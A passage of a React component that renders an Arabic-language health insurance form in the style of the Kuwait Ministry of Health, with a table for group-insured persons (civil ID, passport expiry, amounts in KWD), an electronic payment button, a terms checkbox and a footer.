              }
            </p>
          )}
        </div>
        )}

        {/* Group Insurance Table Section - only for ضمان جماعي */}
        {serviceType && isGroupInsurance && (
          <div style={{ background: '#fff', padding: '15px 20px', borderRadius: 4, border: '1px solid #d0dbe8', marginBottom: 15 }}>
            {/* Section header */}
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 10 }}>
              <div style={{ display: 'flex', gap: 6 }}>
                {/* Add button */}
                <button
                  onClick={handleAddPerson}
                  style={{
                    width: 28, height: 28, borderRadius: 4, border: '2px solid #4CAF50',
                    background: '#fff', color: '#4CAF50', fontSize: 20, fontWeight: 'bold',
                    cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center',
                    lineHeight: 1, padding: 0,
                  }}
                  title="إضافة شخص"
                >
                  +
                </button>
                {/* Delete button */}
                <button
                  onClick={handleDeletePerson}
                  disabled={selectedPersonIndex === null}
                  style={{
                    width: 28, height: 28, borderRadius: 4, border: '2px solid #d32f2f',
                    background: '#fff', color: '#d32f2f', fontSize: 16, fontWeight: 'bold',
                    cursor: selectedPersonIndex !== null ? 'pointer' : 'not-allowed',
                    display: 'flex', alignItems: 'center', justifyContent: 'center',
                    lineHeight: 1, padding: 0, opacity: selectedPersonIndex !== null ? 1 : 0.5,
                  }}
                  title="حذف شخص"
                >
                  ✕
                </button>
              </div>
              <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
                <span style={{ fontSize: 14, fontWeight: 'bold', color: '#333' }}>مجموعة التأمين</span>
              </div>
            </div>

            {/* Blue gradient bar */}
            <div style={{ height: 6, background: 'linear-gradient(to left, #a8d0e6, #d0e8f0)', borderRadius: 3, marginBottom: 10 }}></div>

            {/* Table */}
            <div style={{ overflowX: 'auto' }}>
              <table className="group-table">
                <thead>
                  <tr>
                    <th>الرقم المدني</th>
                    <th>الاسم</th>
                    <th>الجنس</th>
                    <th>الجنسية</th>
                    <th>نوع الإقامه</th>
                    <th>تاريخ إنتهاء صلاحية الجواز</th>
                    <th>حالة الضمان الصحي</th>
                    <th>عدد السنوات</th>
                    <th>تاريخ البداية</th>
                    <th>تاريخ الانتهاء</th>
                    <th>إجمالي المبلغ</th>
                    <th>حذف</th>
                  </tr>
                </thead>
                <tbody>
                  {groupPersons.length === 0 ? (
                    <tr>
                      <td colSpan={12} style={{ padding: 20, color: '#999', fontStyle: 'italic' }}>
                        لا يوجد أشخاص مضافين - اضغط على زر + لإضافة شخص
                      </td>
                    </tr>
                  ) : (
                    groupPersons.map((p, i) => (
                      <tr
                        key={i}
                        className={selectedPersonIndex === i ? 'selected' : ''}
                        onClick={() => setSelectedPersonIndex(selectedPersonIndex === i ? null : i)}
                      >
                        <td>{p.civilId}</td>
                        <td>{p.name}</td>
                        <td>{p.gender}</td>
                        <td>{p.nationality}</td>
                        <td style={{ fontSize: 10 }}>{p.residenceType}</td>
                        <td>{p.passportExpiry}</td>
                        <td>{p.insuranceStatus}</td>
                        <td>{p.yearsCount}</td>
                        <td>{p.startDate}</td>
                        <td>{p.endDate}</td>
                        <td>{p.amount} د.ك</td>
                        <td>
                          <button
                            onClick={(e) => { e.stopPropagation(); const updated = groupPersons.filter((_, idx) => idx !== i); setGroupPersons(updated); setSelectedPersonIndex(null); }}
                            style={{ background: 'none', border: 'none', color: '#c0392b', fontSize: 18, cursor: 'pointer', fontWeight: 'bold' }}
                            title="حذف"
                          >✕</button>
                        </td>
                      </tr>
                    ))
                  )}
                </tbody>
              </table>
            </div>
          </div>
        )}

        {serviceType && (
        <div style={{ background: '#fff', padding: '15px 25px', borderRadius: 4, border: '1px solid #d0dbe8', marginBottom: 15 }}>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: 15 }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 20 }}>
              <div className="moh-field" style={{ marginBottom: 0 }}>
                <select value={paymentMethod} onChange={(e) => setPaymentMethod(e.target.value)}>
                  <option value="بوابة الدفع الإلكتروني">بوابة الدفع الإلكتروني</option>
                </select>
                <label>طريقة الدفع</label>
              </div>
              <div className="moh-field" style={{ marginBottom: 0 }}>
                <input type="text" value={totalAmount || 0} readOnly style={{ textAlign: 'center', maxWidth: 100 }} />
                <label>إجمالي المبلغ</label>
              </div>
            </div>
            <div style={{ display: 'flex', alignItems: 'center' }}>
              <button
                onClick={handlePayment}
                disabled={!isFormComplete}
                style={{
                  background: isFormComplete ? '#1076BB' : '#ccc',
                  color: '#fff', border: 'none', padding: '10px 30px',
                  fontSize: 14, fontWeight: 'bold', borderRadius: 4,
                  cursor: isFormComplete ? 'pointer' : 'not-allowed',
                  fontFamily: 'Cairo, Tahoma, Arial, sans-serif',
                  whiteSpace: 'nowrap',
                }}
              >
                الدفع الإلكتروني
              </button>
            </div>
          </div>
        </div>
        )}

        {serviceType && (
        <div style={{ background: '#fff', padding: '15px 25px', borderRadius: 4, border: '1px solid #d0dbe8', marginBottom: 30 }}>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: 15, direction: 'rtl' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, direction: 'rtl' }}>
              <input
                type="checkbox"
                checked={agreeTerms}
                onChange={(e) => setAgreeTerms(e.target.checked)}
                style={{ width: 18, height: 18 }}
              />
              <label style={{ fontSize: 14, color: '#333' }}>
                <span style={{ color: 'red' }}>*</span> أوافق{' '}
                <a href="#" onClick={(e) => e.preventDefault()} style={{ color: '#1076BB', textDecoration: 'underline' }}>للشروط والأحكام</a>
              </label>
            </div>
            <button
              onClick={handleClear}
              style={{
                background: '#d32f2f', color: '#fff', border: 'none', padding: '10px 50px',
                fontSize: 15, fontWeight: 'bold', borderRadius: 4, cursor: 'pointer',
                fontFamily: 'Cairo, Tahoma, Arial, sans-serif',
              }}
            >
              مسح
            </button>
          </div>
        </div>
        )}
      </div>

      {/* Footer */}
      <div style={{ textAlign: 'center', padding: '12px 0', background: '#000', marginTop: 'auto' }}>
        <p style={{ color: '#fff', fontSize: 13, margin: 0 }}>© 2019 Ministry Of Health Kuwait . All Rights Reserved.</p>
      </div>
    </div>
  );
}
